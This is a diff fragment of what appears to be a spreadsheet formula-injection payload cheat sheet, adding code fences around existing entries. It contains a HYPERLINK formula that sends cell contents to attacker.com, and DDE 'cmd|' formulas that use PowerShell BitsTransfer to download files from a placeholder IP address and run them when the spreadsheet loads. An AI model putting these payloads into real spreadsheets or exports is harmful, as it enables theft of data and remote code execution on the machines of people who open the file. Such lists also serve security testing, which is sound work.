@@ -32,12 +32,15 @@ Data
 
 Use Hyperlink formula to send data to attacking server
 ------------------------------------------------------
+```
 # This will send the data from cells "C2" and "D2" to the attackers server using the GET method. 
 =HYPERLINK("http://www.attacker.com?leak="&C2&D2,"Please click for further information")
-
+```
 
 Execute content when the spreadsheet loads
 ------------------------------------------------
+```
 # Works with any payload, will open associated extension or run exe, bat, etc....
 =cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/index.jpeg;Start-Process index.jpeg'!A0
 =cmd|'/C powershell Import-Module BitsTransfer;Start-BitsTransfer -source http://xxx.xxx.xxx.xxx/ps.bat;Start-Process ps.bat'!A0
+```
